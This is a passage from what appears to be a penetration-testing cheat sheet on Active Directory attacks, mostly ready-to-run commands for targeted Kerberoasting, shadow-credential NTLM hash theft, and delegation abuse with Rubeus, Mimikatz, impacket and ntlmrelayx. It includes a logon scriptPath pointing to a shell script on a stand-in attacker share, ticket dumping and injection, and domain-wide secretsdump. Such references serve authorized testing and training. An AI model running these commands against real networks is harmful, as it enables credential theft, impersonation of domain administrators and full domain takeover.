</span><span id="__span-86-13"><a id="__codelineno-86-13" name="__codelineno-86-13" href="#__codelineno-86-13"></a><span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s2">&quot;domain\controlleduser&quot;</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span>
</span><span id="__span-86-14"><a id="__codelineno-86-14" name="__codelineno-86-14" href="#__codelineno-86-14"></a><span class="nb">Set-ADUser</span> <span class="n">targetuser</span> <span class="n">-ServicePrincipalNames</span> <span class="p">@{</span><span class="n">Add</span><span class="p">=</span><span class="s2">&quot;http/kerberoast&quot;</span><span class="p">}</span> <span class="n">-Credential</span> <span class="nv">$Cred</span>
</span><span id="__span-86-15"><a id="__codelineno-86-15" name="__codelineno-86-15" href="#__codelineno-86-15"></a>
</span><span id="__span-86-16"><a id="__codelineno-86-16" name="__codelineno-86-16" href="#__codelineno-86-16"></a>
</span><span id="__span-86-17"><a id="__codelineno-86-17" name="__codelineno-86-17" href="#__codelineno-86-17"></a><span class="c"># KALI LINUX</span>
</span><span id="__span-86-18"><a id="__codelineno-86-18" name="__codelineno-86-18" href="#__codelineno-86-18"></a><span class="c"># Method 1: Target Kerberoasting by adding SPN to it and requesting TGS</span>
</span><span id="__span-86-19"><a id="__codelineno-86-19" name="__codelineno-86-19" href="#__codelineno-86-19"></a><span class="n">targetedKerberoast</span><span class="p">.</span><span class="n">py</span> <span class="n">-v</span> <span class="n">-d</span> <span class="s1">&#39;domain.com&#39;</span> <span class="n">-u</span> <span class="s1">&#39;controlled-user&#39;</span> <span class="n">-p</span> <span class="s1">&#39;pass&#39;</span> <span class="p">-</span><span class="n">-dc-ip</span> <span class="nv">$IP1</span> <span class="p">-</span><span class="n">-request-user</span> <span class="n">target-user</span> <span class="n">-o</span> <span class="n">tuser</span><span class="p">.</span><span class="n">kerberaost</span>
</span><span id="__span-86-20"><a id="__codelineno-86-20" name="__codelineno-86-20" href="#__codelineno-86-20"></a><span class="c"># this tool also automatically removes SPN to cleanup traces</span>
</span><span id="__span-86-21"><a id="__codelineno-86-21" name="__codelineno-86-21" href="#__codelineno-86-21"></a>
</span><span id="__span-86-22"><a id="__codelineno-86-22" name="__codelineno-86-22" href="#__codelineno-86-22"></a><span class="c"># Method 1: Add SPN using impacket&#39;s ldapmod</span>
</span><span id="__span-86-23"><a id="__codelineno-86-23" name="__codelineno-86-23" href="#__codelineno-86-23"></a><span class="n">ldapmodify</span><span class="p">.</span><span class="n">py</span> <span class="s1">&#39;domain/controlleduser:MyP@ssw0rd&#39;</span> <span class="n">-dc-ip</span> <span class="nv">$DC_IP</span> <span class="n">-H</span> <span class="n">ldap</span><span class="p">://</span><span class="nv">$DC_IP</span> <span class="p">&lt;&lt;</span><span class="n">EOF</span>
</span><span id="__span-86-24"><a id="__codelineno-86-24" name="__codelineno-86-24" href="#__codelineno-86-24"></a><span class="n">dn</span><span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">targetuser</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">domain</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">com</span>
</span><span id="__span-86-25"><a id="__codelineno-86-25" name="__codelineno-86-25" href="#__codelineno-86-25"></a><span class="n">changetype</span><span class="p">:</span> <span class="n">modify</span>
</span><span id="__span-86-26"><a id="__codelineno-86-26" name="__codelineno-86-26" href="#__codelineno-86-26"></a><span class="n">add</span><span class="p">:</span> <span class="n">servicePrincipalName</span>
</span><span id="__span-86-27"><a id="__codelineno-86-27" name="__codelineno-86-27" href="#__codelineno-86-27"></a><span class="n">servicePrincipalName</span><span class="p">:</span> <span class="n">http</span><span class="p">/</span><span class="n">kerberoast</span>
</span><span id="__span-86-28"><a id="__codelineno-86-28" name="__codelineno-86-28" href="#__codelineno-86-28"></a><span class="n">EOF</span>
</span><span id="__span-86-29"><a id="__codelineno-86-29" name="__codelineno-86-29" href="#__codelineno-86-29"></a>
</span><span id="__span-86-30"><a id="__codelineno-86-30" name="__codelineno-86-30" href="#__codelineno-86-30"></a>
</span><span id="__span-86-31"><a id="__codelineno-86-31" name="__codelineno-86-31" href="#__codelineno-86-31"></a><span class="c"># Method 2: Add scriptPath attribute using ldapmodify</span>
</span><span id="__span-86-32"><a id="__codelineno-86-32" name="__codelineno-86-32" href="#__codelineno-86-32"></a><span class="n">ldapmodify</span><span class="p">.</span><span class="n">py</span> <span class="s1">&#39;domain/controlleduser:MyP@ssw0rd&#39;</span> <span class="n">-dc-ip</span> <span class="nv">$DC_IP</span> <span class="n">-H</span> <span class="n">ldap</span><span class="p">://</span><span class="nv">$DC_IP</span> <span class="p">&lt;&lt;</span><span class="n">EOF</span>
</span><span id="__span-86-33"><a id="__codelineno-86-33" name="__codelineno-86-33" href="#__codelineno-86-33"></a><span class="n">dn</span><span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">targetuser</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">domain</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">com</span>
</span><span id="__span-86-34"><a id="__codelineno-86-34" name="__codelineno-86-34" href="#__codelineno-86-34"></a><span class="n">changetype</span><span class="p">:</span> <span class="n">modify</span>
</span><span id="__span-86-35"><a id="__codelineno-86-35" name="__codelineno-86-35" href="#__codelineno-86-35"></a><span class="n">replace</span><span class="p">:</span> <span class="n">scriptPath</span>
</span><span id="__span-86-36"><a id="__codelineno-86-36" name="__codelineno-86-36" href="#__codelineno-86-36"></a><span class="n">scriptPath</span><span class="p">:</span> <span class="p">\\</span><span class="n">attacker</span><span class="p">\</span><span class="n">share</span><span class="p">\</span><span class="n">shell</span><span class="p">.</span><span class="n">bat</span>
</span><span id="__span-86-37"><a id="__codelineno-86-37" name="__codelineno-86-37" href="#__codelineno-86-37"></a><span class="n">EOF</span>
</span><span id="__span-86-38"><a id="__codelineno-86-38" name="__codelineno-86-38" href="#__codelineno-86-38"></a>
</span><span id="__span-86-39"><a id="__codelineno-86-39" name="__codelineno-86-39" href="#__codelineno-86-39"></a><span class="c"># Method 3: Add SPN using python-ldap (custom script)</span>
</span><span id="__span-86-40"><a id="__codelineno-86-40" name="__codelineno-86-40" href="#__codelineno-86-40"></a><span class="c"># Example snippet in Python:</span>
</span><span id="__span-86-41"><a id="__codelineno-86-41" name="__codelineno-86-41" href="#__codelineno-86-41"></a><span class="n">import</span> <span class="n">ldap</span><span class="p">,</span> <span class="n">ldap</span><span class="p">.</span><span class="n">modlist</span> <span class="n">as</span> <span class="n">modlist</span>
</span><span id="__span-86-42"><a id="__codelineno-86-42" name="__codelineno-86-42" href="#__codelineno-86-42"></a><span class="n">l</span> <span class="p">=</span> <span class="n">ldap</span><span class="p">.</span><span class="n">initialize</span><span class="p">(</span><span class="s2">&quot;ldap://$DC_IP&quot;</span><span class="p">)</span>
</span><span id="__span-86-43"><a id="__codelineno-86-43" name="__codelineno-86-43" href="#__codelineno-86-43"></a><span class="n">l</span><span class="p">.</span><span class="n">simple_bind_s</span><span class="p">(</span><span class="s2">&quot;domain\\controlleduser&quot;</span><span class="p">,</span> <span class="s2">&quot;MyP@ssw0rd&quot;</span><span class="p">)</span>
</span><span id="__span-86-44"><a id="__codelineno-86-44" name="__codelineno-86-44" href="#__codelineno-86-44"></a><span class="n">dn</span> <span class="p">=</span> <span class="s2">&quot;CN=targetuser,CN=Users,DC=domain,DC=com&quot;</span>
</span><span id="__span-86-45"><a id="__codelineno-86-45" name="__codelineno-86-45" href="#__codelineno-86-45"></a><span class="n">attrs</span> <span class="p">=</span> <span class="p">[(</span><span class="n">ldap</span><span class="p">.</span><span class="n">MOD_ADD</span><span class="p">,</span> <span class="s1">&#39;servicePrincipalName&#39;</span><span class="p">,</span> <span class="n">b</span><span class="s1">&#39;http/kerberoast&#39;</span><span class="p">)]</span>
</span><span id="__span-86-46"><a id="__codelineno-86-46" name="__codelineno-86-46" href="#__codelineno-86-46"></a><span class="n">l</span><span class="p">.</span><span class="n">modify_s</span><span class="p">(</span><span class="n">dn</span><span class="p">,</span> <span class="n">attrs</span><span class="p">)</span>
</span><span id="__span-86-47"><a id="__codelineno-86-47" name="__codelineno-86-47" href="#__codelineno-86-47"></a>
</span><span id="__span-86-48"><a id="__codelineno-86-48" name="__codelineno-86-48" href="#__codelineno-86-48"></a><span class="c"># Method 4: Create new SPN then perform Kerberoasting</span>
</span><span id="__span-86-49"><a id="__codelineno-86-49" name="__codelineno-86-49" href="#__codelineno-86-49"></a><span class="n">impacket-GetUserSPNs</span> <span class="n">domain</span><span class="p">/</span><span class="n">controlleduser</span><span class="p">:</span><span class="n">MyP</span><span class="nv">@ssw0rd</span> <span class="n">-dc-ip</span> <span class="nv">$DC_IP</span> <span class="n">-request</span> <span class="n">-outputfile</span> <span class="n">hash</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-86-50"><a id="__codelineno-86-50" name="__codelineno-86-50" href="#__codelineno-86-50"></a><span class="c"># Crack the ticket hash with hashcat or john</span>
</span></code></pre></div>
<h6 id="shadow-credentials-attack-to-grab-ntlm-hash">Shadow Credentials Attack - to grab NTLM Hash</h6>
<p>https://i-tracing.com/blog/dacl-shadow-credentials/
<div class="language-shell highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>pywhisker.py<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span><span class="w"> </span>--target<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$TARGET</span><span class="s2">&quot;</span><span class="w"> </span>--action<span class="w"> </span><span class="s2">&quot;list&quot;</span><span class="w"> </span>--dc-ip<span class="w"> </span><span class="nv">$IP</span>
</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a>pywhisker.py<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span><span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASSWORD</span><span class="s2">&quot;</span><span class="w"> </span>--target<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$TARGET</span><span class="s2">&quot;</span><span class="w"> </span>--action<span class="w"> </span><span class="s2">&quot;add&quot;</span><span class="w"> </span>--dc-ip<span class="w"> </span><span class="nv">$IP</span>
</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#__codelineno-87-3"></a>
</span><span id="__span-87-4"><a id="__codelineno-87-4" name="__codelineno-87-4" href="#__codelineno-87-4"></a>python3<span class="w"> </span>PKINITtools/gettgtpkinit.py<span class="w"> </span>-cert-pfx<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PFX_CERTIFICATE</span><span class="s2">&quot;</span><span class="w"> </span>-pfx-pass<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PFX_PASSWORD</span><span class="s2">&quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span>/<span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span><span class="w"> </span>output_TGT.ccache<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$IP</span>
</span><span id="__span-87-5"><a id="__codelineno-87-5" name="__codelineno-87-5" href="#__codelineno-87-5"></a>
</span><span id="__span-87-6"><a id="__codelineno-87-6" name="__codelineno-87-6" href="#__codelineno-87-6"></a>python3<span class="w"> </span>PKINITtools/getnthash.py<span class="w"> </span>domain/user<span class="w"> </span>-key<span class="w"> </span>&lt;Hex_KEY_GENERATED_FROM_THE_ABOVE&gt;<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$IP</span>
</span></code></pre></div></p>
<hr />
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>Recommended <a href="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-acl-ace/">InternalAllTheThings</a> to know about AD attack</p>
</div>
<h4 id="delegation-attacks">Delegation Attacks</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="c1"># kali linux</span>
</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>impacket-findDelegation<span class="w"> </span>-dc-ip<span class="w"> </span>&lt;DCIP&gt;<span class="w"> </span>domain.local/USERNAME
</span></code></pre></div>
<h5 id="unconstrained-delegation-abuse">🟥 Unconstrained Delegation Abuse</h5>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a><span class="c"># Enumerate</span>
</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a><span class="c"># PowerView</span>
</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3" href="#__codelineno-89-3"></a><span class="nb">Get-DomainComputer</span> <span class="n">-unconstrained</span> 
</span><span id="__span-89-4"><a id="__codelineno-89-4" name="__codelineno-89-4" href="#__codelineno-89-4"></a>
</span><span id="__span-89-5"><a id="__codelineno-89-5" name="__codelineno-89-5" href="#__codelineno-89-5"></a>
</span><span id="__span-89-6"><a id="__codelineno-89-6" name="__codelineno-89-6" href="#__codelineno-89-6"></a><span class="c"># Explanation:</span>
</span><span id="__span-89-7"><a id="__codelineno-89-7" name="__codelineno-89-7" href="#__codelineno-89-7"></a><span class="c"># If a system/user account is trusted for delegation, it caches incoming users&#39; TGTs.</span>
</span><span id="__span-89-8"><a id="__codelineno-89-8" name="__codelineno-89-8" href="#__codelineno-89-8"></a><span class="c"># An attacker who gains SYSTEM access on such a machine can dump those TGTs,</span>
</span><span id="__span-89-9"><a id="__codelineno-89-9" name="__codelineno-89-9" href="#__codelineno-89-9"></a><span class="c"># including Domain Admin TGTs, if they log in.</span>
</span><span id="__span-89-10"><a id="__codelineno-89-10" name="__codelineno-89-10" href="#__codelineno-89-10"></a>
</span><span id="__span-89-11"><a id="__codelineno-89-11" name="__codelineno-89-11" href="#__codelineno-89-11"></a><span class="c"># Purpose:</span>
</span><span id="__span-89-12"><a id="__codelineno-89-12" name="__codelineno-89-12" href="#__codelineno-89-12"></a><span class="c"># Steal TGTs from memory and impersonate privileged users (e.g., DA).</span>
</span><span id="__span-89-13"><a id="__codelineno-89-13" name="__codelineno-89-13" href="#__codelineno-89-13"></a>
</span><span id="__span-89-14"><a id="__codelineno-89-14" name="__codelineno-89-14" href="#__codelineno-89-14"></a><span class="c"># Windows (Attacker has SYSTEM access on a machine with unconstrained delegation):</span>
</span><span id="__span-89-15"><a id="__codelineno-89-15" name="__codelineno-89-15" href="#__codelineno-89-15"></a><span class="c"># List machines with unconstrained delegation:</span>
</span><span id="__span-89-16"><a id="__codelineno-89-16" name="__codelineno-89-16" href="#__codelineno-89-16"></a><span class="nb">Get-DomainComputer</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">TrustedForDelegation</span> <span class="o">-eq</span> <span class="nv">$true</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">TrustedForDelegation</span>
</span><span id="__span-89-17"><a id="__codelineno-89-17" name="__codelineno-89-17" href="#__codelineno-89-17"></a>
</span><span id="__span-89-18"><a id="__codelineno-89-18" name="__codelineno-89-18" href="#__codelineno-89-18"></a><span class="c"># Dump TGTs using Rubeus:</span>
</span><span id="__span-89-19"><a id="__codelineno-89-19" name="__codelineno-89-19" href="#__codelineno-89-19"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">tgtdeleg</span>               <span class="c"># Request TGT for current user (if allowed)</span>
</span><span id="__span-89-20"><a id="__codelineno-89-20" name="__codelineno-89-20" href="#__codelineno-89-20"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">dump</span>                   <span class="c"># View available tickets</span>
</span><span id="__span-89-21"><a id="__codelineno-89-21" name="__codelineno-89-21" href="#__codelineno-89-21"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:&lt;</span><span class="n">base64</span><span class="p">&gt;</span>  <span class="c"># Pass the ticket to impersonate</span>
</span><span id="__span-89-22"><a id="__codelineno-89-22" name="__codelineno-89-22" href="#__codelineno-89-22"></a>
</span><span id="__span-89-23"><a id="__codelineno-89-23" name="__codelineno-89-23" href="#__codelineno-89-23"></a><span class="c"># Or with Mimikatz:</span>
</span><span id="__span-89-24"><a id="__codelineno-89-24" name="__codelineno-89-24" href="#__codelineno-89-24"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span>                 <span class="c"># View Kerberos tickets</span>
</span><span id="__span-89-25"><a id="__codelineno-89-25" name="__codelineno-89-25" href="#__codelineno-89-25"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span>        <span class="c"># Inject the stolen ticket</span>
</span><span id="__span-89-26"><a id="__codelineno-89-26" name="__codelineno-89-26" href="#__codelineno-89-26"></a>
</span><span id="__span-89-27"><a id="__codelineno-89-27" name="__codelineno-89-27" href="#__codelineno-89-27"></a><span class="c"># Extra [Reference Video](https://youtu.be/eDmkkL108W4?si=7mYg-2mDjdF4KWEb&amp;t=339) to capture DC01$ tgt </span>
</span><span id="__span-89-28"><a id="__codelineno-89-28" name="__codelineno-89-28" href="#__codelineno-89-28"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">monitory</span> <span class="p">/</span><span class="n">interval</span><span class="p">:</span><span class="n">10</span> <span class="p">/</span><span class="n">filteruser</span><span class="p">:</span><span class="n">dc01</span><span class="p">$</span>
</span><span id="__span-89-29"><a id="__codelineno-89-29" name="__codelineno-89-29" href="#__codelineno-89-29"></a><span class="n">SpoolSample</span><span class="p">.</span><span class="n">exe</span> <span class="n">DC01</span> <span class="p">&lt;</span><span class="n">delegatedcomputername</span><span class="p">&gt;</span> <span class="c"># [Tool GitHub](https://github.com/leechristensen/SpoolSample)</span>
</span><span id="__span-89-30"><a id="__codelineno-89-30" name="__codelineno-89-30" href="#__codelineno-89-30"></a>
</span><span id="__span-89-31"><a id="__codelineno-89-31" name="__codelineno-89-31" href="#__codelineno-89-31"></a>
</span><span id="__span-89-32"><a id="__codelineno-89-32" name="__codelineno-89-32" href="#__codelineno-89-32"></a><span class="c"># Kali Linux (relaying or extracting from memory dumps):</span>
</span><span id="__span-89-33"><a id="__codelineno-89-33" name="__codelineno-89-33" href="#__codelineno-89-33"></a><span class="c"># Use secretsdump.py if SYSTEM hash is available</span>
</span><span id="__span-89-34"><a id="__codelineno-89-34" name="__codelineno-89-34" href="#__codelineno-89-34"></a><span class="n">impacket-secretsdump</span> <span class="n">-just-dc</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">domain</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">username</span><span class="nv">@dc</span><span class="n">-ip</span>
</span></code></pre></div>
<h5 id="constrained-delegation-abuse">🟨 Constrained Delegation Abuse</h5>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a><span class="c"># Explanation:</span>
</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a><span class="c"># A user or computer account is delegated to impersonate others only to specific services (e.g., CIFS).</span>
</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a><span class="c"># If TrustedToAuthForDelegation is enabled, the attacker can impersonate any user (DA) to allowed services.</span>
</span><span id="__span-90-4"><a id="__codelineno-90-4" name="__codelineno-90-4" href="#__codelineno-90-4"></a>
</span><span id="__span-90-5"><a id="__codelineno-90-5" name="__codelineno-90-5" href="#__codelineno-90-5"></a><span class="c"># Purpose:</span>
</span><span id="__span-90-6"><a id="__codelineno-90-6" name="__codelineno-90-6" href="#__codelineno-90-6"></a><span class="c"># Impersonate Domain Admin to specific service (like CIFS or HTTP) via S4U2Self + S4U2Proxy.</span>
</span><span id="__span-90-7"><a id="__codelineno-90-7" name="__codelineno-90-7" href="#__codelineno-90-7"></a>
</span><span id="__span-90-8"><a id="__codelineno-90-8" name="__codelineno-90-8" href="#__codelineno-90-8"></a><span class="c"># Windows (use Rubeus to abuse constrained delegation):</span>
</span><span id="__span-90-9"><a id="__codelineno-90-9" name="__codelineno-90-9" href="#__codelineno-90-9"></a><span class="c"># Step 1: Request TGT for compromised user:</span>
</span><span id="__span-90-10"><a id="__codelineno-90-10" name="__codelineno-90-10" href="#__codelineno-90-10"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">svc_account</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:&lt;</span><span class="n">NTLM</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">&gt;</span>
</span><span id="__span-90-11"><a id="__codelineno-90-11" name="__codelineno-90-11" href="#__codelineno-90-11"></a>
</span><span id="__span-90-12"><a id="__codelineno-90-12" name="__codelineno-90-12" href="#__codelineno-90-12"></a><span class="c"># Step 2: Request a service ticket to impersonate DA:</span>
</span><span id="__span-90-13"><a id="__codelineno-90-13" name="__codelineno-90-13" href="#__codelineno-90-13"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">svc_account</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:&lt;</span><span class="n">NTLM</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">targethost</span> <span class="p">/</span><span class="n">domain</span><span class="p">:&lt;</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">altservice</span><span class="p">:</span><span class="n">cifs</span>
</span><span id="__span-90-14"><a id="__codelineno-90-14" name="__codelineno-90-14" href="#__codelineno-90-14"></a>
</span><span id="__span-90-15"><a id="__codelineno-90-15" name="__codelineno-90-15" href="#__codelineno-90-15"></a><span class="c"># Optional: Inject the resulting ticket</span>
</span><span id="__span-90-16"><a id="__codelineno-90-16" name="__codelineno-90-16" href="#__codelineno-90-16"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:&lt;</span><span class="n">base64</span><span class="p">&gt;</span>
</span><span id="__span-90-17"><a id="__codelineno-90-17" name="__codelineno-90-17" href="#__codelineno-90-17"></a>
</span><span id="__span-90-18"><a id="__codelineno-90-18" name="__codelineno-90-18" href="#__codelineno-90-18"></a><span class="c"># Kali Linux (Steps):</span>
</span><span id="__span-90-19"><a id="__codelineno-90-19" name="__codelineno-90-19" href="#__codelineno-90-19"></a>
</span><span id="__span-90-20"><a id="__codelineno-90-20" name="__codelineno-90-20" href="#__codelineno-90-20"></a><span class="c"># 1. Get TGT for the compromised account with constrained delegation:</span>
</span><span id="__span-90-21"><a id="__codelineno-90-21" name="__codelineno-90-21" href="#__codelineno-90-21"></a><span class="n">getTGT</span><span class="p">.</span><span class="n">py</span> <span class="n">-hashes</span> <span class="p">:&lt;</span><span class="n">NTLM_HASH</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/&lt;</span><span class="n">user</span><span class="p">&gt;</span>
</span><span id="__span-90-22"><a id="__codelineno-90-22" name="__codelineno-90-22" href="#__codelineno-90-22"></a>
</span><span id="__span-90-23"><a id="__codelineno-90-23" name="__codelineno-90-23" href="#__codelineno-90-23"></a><span class="c"># 2. Use TGT to request service ticket for Administrator to a service (e.g., CIFS):</span>
</span><span id="__span-90-24"><a id="__codelineno-90-24" name="__codelineno-90-24" href="#__codelineno-90-24"></a><span class="n">getST</span><span class="p">.</span><span class="n">py</span> <span class="n">-impersonate</span> <span class="n">Administrator</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/&lt;</span><span class="n">target-fqdn</span><span class="p">&gt;</span> <span class="n">-hashes</span> <span class="p">:&lt;</span><span class="n">NTLM_HASH</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/&lt;</span><span class="n">delegated-user</span><span class="p">&gt;</span>
</span><span id="__span-90-25"><a id="__codelineno-90-25" name="__codelineno-90-25" href="#__codelineno-90-25"></a>
</span><span id="__span-90-26"><a id="__codelineno-90-26" name="__codelineno-90-26" href="#__codelineno-90-26"></a><span class="c"># 3. Use resulting .ccache file:</span>
</span><span id="__span-90-27"><a id="__codelineno-90-27" name="__codelineno-90-27" href="#__codelineno-90-27"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="n">Administrator</span><span class="p">.</span><span class="n">ccache</span>
</span><span id="__span-90-28"><a id="__codelineno-90-28" name="__codelineno-90-28" href="#__codelineno-90-28"></a><span class="n">klist</span>
</span><span id="__span-90-29"><a id="__codelineno-90-29" name="__codelineno-90-29" href="#__codelineno-90-29"></a><span class="n">impacket-psexec</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/</span><span class="n">Administrator</span><span class="p">@&lt;</span><span class="n">target-ip</span><span class="p">&gt;</span>
</span><span id="__span-90-30"><a id="__codelineno-90-30" name="__codelineno-90-30" href="#__codelineno-90-30"></a>
</span><span id="__span-90-31"><a id="__codelineno-90-31" name="__codelineno-90-31" href="#__codelineno-90-31"></a>
</span><span id="__span-90-32"><a id="__codelineno-90-32" name="__codelineno-90-32" href="#__codelineno-90-32"></a><span class="c"># Not directly useful unless using ntlmrelayx with delegation abuse via LDAP</span>
</span><span id="__span-90-33"><a id="__codelineno-90-33" name="__codelineno-90-33" href="#__codelineno-90-33"></a><span class="n">ntlmrelayx</span><span class="p">.</span><span class="n">py</span> <span class="n">-t</span> <span class="n">ldap</span><span class="p">://</span><span class="n">dc-ip</span> <span class="p">-</span><span class="n">-delegate-access</span>
</span></code></pre></div>
<h5 id="resource-based-constrained-delegation-rbcd-abuse">🟩 Resource-Based Constrained Delegation (RBCD) Abuse</h5>
<p>GenericAll on a computer object can be used to perform a Resource-Based Constrained Delegation attack.</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a><span class="c"># Explanation:</span>
</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2" href="#__codelineno-91-2"></a><span class="c"># Target computer specifies who can delegate to it (via msDS-AllowedToActOnBehalfOfOtherIdentity).</span>
</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3" href="#__codelineno-91-3"></a><span class="c"># If attacker has GenericWrite or WriteDACL on a computer object, they can set their own user/computer as a delegator.</span>
</span><span id="__span-91-4"><a id="__codelineno-91-4" name="__codelineno-91-4" href="#__codelineno-91-4"></a>
</span><span id="__span-91-5"><a id="__codelineno-91-5" name="__codelineno-91-5" href="#__codelineno-91-5"></a><span class="c"># Purpose:</span>
</span><span id="__span-91-6"><a id="__codelineno-91-6" name="__codelineno-91-6" href="#__codelineno-91-6"></a><span class="c"># Gain ability to impersonate any user (e.g., DA) to that computer via Kerberos (S4U abuse).</span>
</span><span id="__span-91-7"><a id="__codelineno-91-7" name="__codelineno-91-7" href="#__codelineno-91-7"></a>
</span><span id="__span-91-8"><a id="__codelineno-91-8" name="__codelineno-91-8" href="#__codelineno-91-8"></a><span class="c"># Windows:</span>
</span><span id="__span-91-9"><a id="__codelineno-91-9" name="__codelineno-91-9" href="#__codelineno-91-9"></a><span class="c"># Step 1: Add your user to the target computer’s msDS-AllowedToActOnBehalfOfOtherIdentity:</span>
</span><span id="__span-91-10"><a id="__codelineno-91-10" name="__codelineno-91-10" href="#__codelineno-91-10"></a><span class="c"># Using PowerView or equivalent:</span>
</span><span id="__span-91-11"><a id="__codelineno-91-11" name="__codelineno-91-11" href="#__codelineno-91-11"></a><span class="nv">$SID</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-DomainUser</span> <span class="n">eviluser</span><span class="p">).</span><span class="n">SID</span>
</span><span id="__span-91-12"><a id="__codelineno-91-12" name="__codelineno-91-12" href="#__codelineno-91-12"></a><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">ActiveDirectorySecurity</span>
